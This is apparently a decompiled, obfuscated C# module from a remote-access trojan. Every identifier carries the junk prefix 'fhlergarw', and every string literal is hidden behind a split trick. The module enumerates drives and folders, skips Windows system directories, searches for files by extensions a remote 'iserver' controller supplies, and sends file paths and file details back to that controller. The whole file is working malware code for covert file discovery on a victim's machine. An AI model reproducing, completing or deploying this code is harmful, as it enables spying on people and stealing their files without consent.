using System;
using System.Collections.Generic;
using System.IO;

namespace fhlergarw;

internal class fhlergarwDRIVF
{
	public string fhlergarwfilesLogs = fhlergarwCONF.fhlergarwfilesLogs;

	public int fhlergarwfIndx = 0;

	public bool fhlergarwreaging = false;

	public fhlergarwMCDM iserver;

	public List<string> fhlergarwfExts = new List<string>();

	public List<string> fhlergarwnotFilders = new List<string>();

	public string fhlergarwmainPath;

	public int fhlergarwsIndx = 0;

	public List<string> fhlergarwsFiles = new List<string>();

	public bool fhlergarwseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public fhlergarwDRIVF()
	{
		fhlergarwnotFilders.Add("clients_data|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("program files|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("system volume information|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("$recycle.bin|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("msocache|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("recoveDSDF|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("documents and settings|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("windows|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("program files (x86)|fhlergarw".Split(new char[1] { '|' })[0]);
		fhlergarwnotFilders.Add("programdata|fhlergarw".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> fhlergarwaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.fhlergarwautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (fhlergarwseeAccess(text) && !fhlergarwnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void fhlergarwlookFiles(string tempStr)
	{
		iserver.fhlergarwautCnls = false;
		fhlergarwfExts.Clear();
		fhlergarwsFiles.Clear();
		fhlergarwfIndx = 0;
		fhlergarwsIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				fhlergarwfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			fhlergarwreaging = true;
			fhlergarwsendSearch(array[1]);
			fhlergarwreaging = false;
			iserver.fhlergarwpush_data(null, "fhlergarw-seard=searched|fhlergarw".Split(new char[1] { '|' })[0]);
		}
	}

	public string fhlergarwcheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (fhlergarwseeAccess(text2))
				{
					text = text + text2 + ">|fhlergarw".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void fhlergarwsendSearch(string path)
	{
		try
		{
			foreach (string item in fhlergarwaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (fhlergarwfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.fhlergarwfile_info(item, ret: true);
					iserver.fhlergarwpush_data(null, "fhlergarw-searf=|fhlergarw".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|fhlergarw".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.fhlergarwautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string fhlergarwlookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|fhlergarw".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string fhlergarwlookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|fhlergarw".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
